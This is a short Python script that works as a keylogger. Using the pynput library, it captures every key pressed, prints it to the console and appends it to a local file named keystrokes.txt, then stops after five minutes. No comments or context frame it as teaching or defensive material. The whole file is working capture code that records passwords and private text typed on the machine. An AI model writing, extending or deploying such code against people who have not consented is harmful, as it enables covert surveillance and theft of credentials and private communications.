from pynput import keyboard
import threading

log_file = 'keystrokes.txt'
file=open(log_file, 'a')

stop_event = threading.Event()

def on_press(key):
    try:
        print('Pressed Key "{}"'.format(key.char))
    except AttributeError:
        print('{}'.format(key))
    file.write('{}\n'.format(str(key)))
    file.flush()
        
def stop_listener():
    stop_event.set()
    listener.stop()
    file.close()

listener = keyboard.Listener(on_press=on_press)
listener.start()

timer = threading.Timer(300, stop_listener)
timer.start()

stop_event.wait()
listener.stop()
listener.join()

